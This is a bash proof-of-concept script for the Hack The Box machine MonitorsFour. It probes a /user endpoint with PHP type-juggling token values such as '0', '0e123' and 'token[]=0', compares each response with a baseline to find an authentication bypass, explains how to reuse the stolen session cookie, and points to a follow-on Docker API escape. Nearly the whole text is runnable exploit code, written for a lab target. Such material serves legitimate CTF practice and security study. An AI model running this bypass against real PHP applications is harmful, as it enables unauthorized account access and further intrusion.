#!/usr/bin/env bash
# HTB MonitorsFour — PHP loose comparison ("type juggling") on the token parameter
# Source: monitorsfour.txt   |   Arsenal ref: §6.1
#
# The portal compares a user-supplied token loosely. Under pre-8.0 PHP semantics a
# numeric string compared to a non-numeric string coerces the string to 0, so "0"
# (and any 0e-prefixed value already in the magic-hash form) authenticates.
#
# Gardener: a single curl proves it only if you diff against a control response —
# a 302 with no Set-Cookie is just a redirect to the login page.
#
# Usage:
#   ./poc_htb_monitorsfour_token.sh http://monitorsfour.htb
#   ./poc_htb_monitorsfour_token.sh http://monitorsfour.htb --path /user

set -u
BASE="${1:-http://monitorsfour.htb}"
shift || true
PATH_="/user"

while [ $# -gt 0 ]; do
  case "$1" in
    --path) PATH_="$2"; shift 2 ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

probe() {
  local label="$1" query="$2"
  local out code size loc cookie
  out=$(curl -s -o /tmp/.m4body -D /tmp/.m4hdr -w '%{http_code} %{size_download}' \
        --max-time 12 "$BASE$PATH_?$query")
  code=${out%% *}; size=${out##* }
  loc=$(grep -i '^location:' /tmp/.m4hdr | tr -d '\r' | cut -d' ' -f2-)
  cookie=$(grep -i '^set-cookie:' /tmp/.m4hdr | tr -d '\r' | cut -d' ' -f2 | cut -d= -f1)
  printf '%-22s %-5s %-6s login:%-8s cookie:%s\n' \
    "$label" "$code" "$size" "${loc:-none}" "${cookie:-none}"
}

echo "=== control (no token) ==="
probe "baseline" "x=1"
echo "=== type-juggling candidates ==="
probe "token=0"          "token=0"
probe "token=0e123"      "token=0e123"
probe "token=00"         "token=00"
probe "token[]="         "token[]=0"
probe "token=true"       "token=true"

cat <<'EOF'

=== Reading the result ===
A successful bypass shows a Set-Cookie for a session and a different body size than the
baseline. A 302 to /login with no cookie means the token was rejected.
If token=0 works, capture the session and enumerate:
    curl -s -b 'PHPSESSID=<value>' http://monitorsfour.htb/user
The subsequent step on this box is the Docker API escape (poc_htb_monitorsfour_docker.py).
EOF
rm -f /tmp/.m4body /tmp/.m4hdr
